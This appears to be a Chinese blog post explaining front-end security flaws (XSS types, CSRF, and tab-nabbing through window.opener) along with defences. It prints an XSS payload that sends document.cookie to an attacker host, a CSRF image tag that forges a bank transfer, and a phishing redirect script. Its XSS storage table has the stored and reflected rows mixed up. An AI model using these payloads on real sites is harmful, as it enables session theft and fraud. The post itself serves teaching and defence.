---
title: Web前端常见安全问题
date: 2019-05-26 12:12:57
categories: web前端
tags:
- javascript
---

> 随着互联网的高速发展，安全问题已成为企业最关注的焦点之一。而前端又是容易引发安全问题的“窗口”，作为开发人员的我们，更需要充分了解如何预防和修复安全漏洞。本文将列举常见的前端安全问题，希望对大家有所帮助。

## 1、XSS 安全漏洞

> **跨站脚本** （英语：Cross-site scripting，通常简称为：XSS）是一种网站应用程序的安全漏洞攻击，是[代码注入](https://zh.wikipedia.org/wiki/代碼注入)的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了[HTML](https://zh.wikipedia.org/wiki/HTML)以及用户端[脚本语言](https://zh.wikipedia.org/wiki/腳本語言)。攻击者通过在目标网站上注入恶意脚本并运行，获取用户的敏感信息如 Cookie、SessionID等，影响网站与用户数据安全。
>
> 开始这种攻击的案例是跨域的，所以叫做“跨站脚本”。但是发展到今天，由于JS的强大以及网站前端应用的复杂化，是否跨域已经不再重要。但由于历史原因，XSS这个名字却一直保留下来。
>
> 本质是恶意代码未经过滤，与网站正常的代码混在一起，浏览器无法分辨哪些脚本是可信的，导致恶意脚本执行。



有个有意思的小点点，**Cross-site scripting** 的缩写本应该是 **CSS**，但是为了和 **Cascading Style Sheet** (层叠样式表，不知道我在说什么的前端同学自己去蹲墙角)区分开来，所以将其缩写成 **XSS**。

#### 分类

总的来说，**XSS** 分为三类，**存储型XSS**、**反射型XSS**、**DOM-Based XSS**

| 类型          | 存储区                  | 插入点 |
| ------------- | ----------------------- | ------ |
| 存储型XSS     | url                     | html   |
| 反射型XSS     | 后端数据库              | html   |
| DOM-Based XSS | 后端数据库/前端存储/url | 前端js |



##### 存储型XSS

> 数据库中某些字段存有 XSS 攻击数据，在客户端获取后未经过转移直接被浏览器渲染就可能导致 XSS 攻击。受害人数较多，凡是打开相应页面请求相应数据的人都会中招。

举例：

假设有一个博客园或者论坛之类的网站，我在上面发了一篇文章，内容包含以下攻击代码

```javascript
<script>window.open("www.myserver.com?param="+document.cookie)</script>
```

如果网站没有进行处理直接渲染的话，那么凡是打开我这篇文章的人，他们的cookie信息都会发送到我的服务器上。



#### 反射型XSS

> 给别人发送带有恶意脚本代码参数的 URL，当 URL 地址被打开时，特有的恶意代码参数被 HTML 解析、执行。它的特点是非持久化，必须用户点击带有特定参数的链接才能触发。

举例：

假如有这么一个链接 `http://test.com?content=hello world`，打开之后页面直接显示

```javascript
hello world
```

这种从参数中提取数据然后加载到 HTML 代码中的方式，如果对于参数没有过滤，就会出现**XSS漏洞**。

比如我们给用户发送一个这样的链接

```javascript
http://test.com?content=<script>window.open("www.myserver.com?param="+document.cookie)</script>
```

跟上面一样，凡是打开这个链接的人，他们的 cookie 信息就会发送到我的服务器上。



#### DOM-Based XSS

> **DOM-Based XSS**漏洞是基于文档对象模型(**Document Object Model**，DOM)的一种漏洞。DOM 是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM 中有很多对象，其中一些是用户可以操纵的，如 url ，location，refelTer 等。客户端的脚本程序可以通过 DOM 动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得 DOM 中的数据在本地执行，如果 DOM 中的数据没有经过严格确认，就会产生 **DOM-Based XSS**漏洞。

举例：

假如有这么一个页面

```javascript
<div id="test"></div>
<input type="text" id="input" />
<button onclick="test()">提交</button>
<script>
    function test () {
        var text = document.getElementById('input').value
        document.getElementById('test').innerHTML = text
    }
</script>
```

假如我们在输入框中输入

```javascript
<script>window.open("www.myserver.com?param="+document.cookie)</script>
```

那么 cookie 又一次发送到了我的服务器上。



#### XSS攻击检测

* 使用XSS攻击字符串手动检测XSS漏洞 [](https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)
* 使用扫描工具自动检测XSS漏洞 例如Arachni、Mozilla HTTP Observatory、w3af等

#### XSS攻击防御

1. 输入输出检查
2. 避免内联事件
3. 富文本类使用标签白名单
4. 增加攻击难度，降低攻击后果
5. 增加验证码，防止脚本冒充用户提交危险操作
6. 通过CSP、输入长度配置、接口安全措施等方法
7. 主动检测发现



## CSRF 跨站请求伪造

> 跨站请求伪造（英语：Cross-site request forgery），也被称为one-click attack 或者 session riding，通常缩写为 **CSRF** 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。
>
> 攻击者盗用受害人身份，以受害人的名义发送恶意请求。 其本质是重要操作的所有参数都是可以被攻击者猜测到的，攻击者只有预测出URL的所有参数与参数值，才能成功地构造一个伪造的请求；反之，攻击者将无法攻击成功。

攻击步骤如下：

1. 用户a打开了浏览器，访问正常的网站A，输入用户名、密码正常发送登录请求到网站A的服务器
2. 此时网站A的服务器确认用户a的登录信息将 cookie 信息返回给浏览器，用户a在 cookie 有效时间内都可以正常的请求网站A的服务器
3. 用户a没有退出网站A，在同一个浏览器打开了网站B
4. 网站B向用户返回了一段恶意代码，这段代码向网站A发起请求
5. 浏览器在发起请求时会自动带上网站A的 cookie 信息，攻击者便达到了在用户a不知情的情况下以其身份向网站A发起请求

举例：

小明在银行中有一笔存款，银行网站通过请求 http://bank.com/withdraw?money=1000&to=username 可以将发起请求的用户账户下的 1000元转到 **username** 账户下。银行服务端在接收到请求后，会验证请求中的 cookie 信息是否合法（用户是否存在、是否登录状态），合法则请求有效。

攻击者 quincychen 在银行中也有账户，通过测试他知道了银行转账的请求格式，于是打起了使用 **CSRF** 的念头。首先，他自己上线了一个网站A，网站中包含这样的代码

```html
<img src="http://bank.com/withdraw?money=10000&to=quincychen" />
```

之后他又写了一个脚本不断的向随机的邮箱发送网站A的链接，其中就有小明的邮箱。此时，小明刚好登录了银行网站查看刚到账的工资，收到邮件在未关闭银行网站的情况下打开了其中的链接。悲剧就这么发生了，小明账户中的 10000 元就这样不知不自觉的赚到了 quincychen 账户中。即使后来小明查到了交易记录，那也是一条合法的转账记录，没有任何被攻击的痕迹。

#### CSRF 攻击防御

目前防御 CSRF 攻击的主要手段有三种

> 1. 验证 http 请求的 Referer字段
> 2. 在请求中添加 token 验证
> 3. 在 http 请求中自定义属性并验证

**验证HTTP Referer**

在 HTTP 协议的规定中，HTTP 请求头带有 Referer 字段，它记录了 HTTP 请求的来源地址。正常情况下，安全受限的 HTTP 请求都来自于自己的网站。比如，栗子中的转账请求应该来自于银行网站[http://bank.com，而不是网站A。**CSRF**攻击只能在攻击者自己的网站中发起，因此，银行网站可以通过验证HTTP请求中的Referer字段来确定请求是否合法。](http://bank.com，而不是网站A。**CSRF**攻击只能在攻击者自己的网站中发起，因此，银行网站可以通过验证HTTP请求中的Referer字段来确定请求是否合法。/)

##### 不足之处

然而，这种方法并不完美。首先，Referer 字段值是由浏览器设定的，虽然 HTTP 协议有明确的规定，但还是很难确保每个浏览器的具体实现是标准、安全的。就目前所知，存在一些方法可以篡改 **IE6** 和 **FireFox2** 发起请求中的Referer值。



**请求中添加token验证**

**CSRF** 攻击成功的关键在于攻击者可以完全伪造用户的请求，所有的验证信息都存在 cookie 中，攻击者即使不知道验证信息的验证方式和结构也可以攻击成功，所以可以通过在请求中放入攻击者无法伪造的信息（不能保存在 cookie 中）来防御 **CSRF** 攻击。比如，前端可以在HTTP请求中以参数的形式加入一个随机产生的 token，后端建立路由拦截器来验证token，如果缺少 token 或 token 错误则认为是危险请求。

##### 不足之处

难以保证 token 本身的安全。特别是在一些支持用户自己发表内容的网站（博客园、论坛等），黑客可以在上面发布自己个人网站的地址。由于系统也会在这个地址后面加上 token，黑客可以在自己的网站上得到这个 token，并马上就可以发动 CSRF 攻击。为了避免这一点，系统可以在添加 token 的时候增加一个判断，如果这个链接是链到自己本站的，就在后面添加 token，如果是通向外网则不加。不过，即使这个 csrftoken 不以参数的形式附加在请求之中，黑客的网站也同样可以通过 Referer 来得到这个 token 值以发动 CSRF 攻击。这也是一些用户喜欢手动关闭浏览器 Referer 功能的原因。



**自定义HTTP头属性并验证**

也是使用 token 并进行验证的方式，不同的是，这里并不是把 token 以参数的形式置于 HTTP 请求之中，而是把它放到 HTTP 头中自定义的属性里。通过 XMLHttpRequest 这个类，可以同意给所有的请求头加上自定义属性（如csrf-token）。

##### 不足之处

然而这种方法的局限性非常大。XMLHttpRequest 请求通常用于 Ajax 方法中对于页面局部的异步刷新，并非所有的请求都适合用这个类来发起，而且通过该类请求得到的页面不能被浏览器所记录下，从而进行前进，后退，刷新，收藏等操作，给用户带来不便。另外，对于没有进行 CSRF 防护的遗留系统来说，要采用这种方法来进行防护，要把所有请求都改为 XMLHttpRequest 请求，这样几乎是要重写整个网站，这代价无疑是不能接受的。



## 3、超链接新窗口跳转问题

在网页中，如果我们要实现让浏览器自动在新标签页中打开链接，很普遍的方式是

```html
<a href="http://www.google.com" target="_blank">google</a>
```

然而，很多同学没有注意到，它其实存在着不安全的因素。

**parent 与 opener**

在了解安全问题前，我们先了解一下问题的根源。

前端的同学应该都知道，在 iframe 标签中提供了一个用于父子页面交互的对象，我们可以通过 `window.parent` 从 iframe 中的页面访问父级页面的`window`对象。

**opener** 和 **parent**一样，两者的区别在于，**opener**用于`<a target="_blank"></a>`。通过`window.opener`可以从新标签页获取到来源页面的`window`对象。

那么，这个安全问题到底是什么？

举例：

攻击者在自己的网站 A 上发布了一篇很不错的博客并在各种技术社区中推广，因此很多网站引用了他的文章，这其中就有部分知名的技术周刊：网站B。网站 B 采用以下代码推荐攻击者的文章

```
<a href="http://www.test.com/article/1" target="_blank">前端安全问题总结</a>
```

攻击者查看了网站B的前端代码，确认了其引用方式，首先，上线了一个外观和网站B非常相似的网站C(网址：[http://www.attack.com)，不同的是网站C上会引导用户输入各种敏感信息。同时，他在原先的博客文章页加上了以下代码](http://www.attack.com)，不同的是网站C上会引导用户输入各种敏感信息。同时，他在原先的博客文章页加上了以下代码/)

```javascript
<script>
    window.opener.location.replace("http://www.attack.com")
</script>
```

当用户浏览网站B，点击了攻击者的推荐文章跳到新标签页开始浏览推荐文章，然而，在不知不觉中，网站B的标签页已经被替换到了非常相似的恶意网站C。

用户在浏览完推荐文章后回到了网站B（但其实是网站C），之后在引导下输入了各种敏感信息，最终导致用户信息泄露。

#### 防范措施

**使用Javascript跳转**

```javascript
function openNewTab (url) {
    var newTab = window.open()
    newTab.opener = null
    newTab.location = url
}
```



>- SQL注入
>- XXE漏洞
>- JSON劫持
>- XST攻击

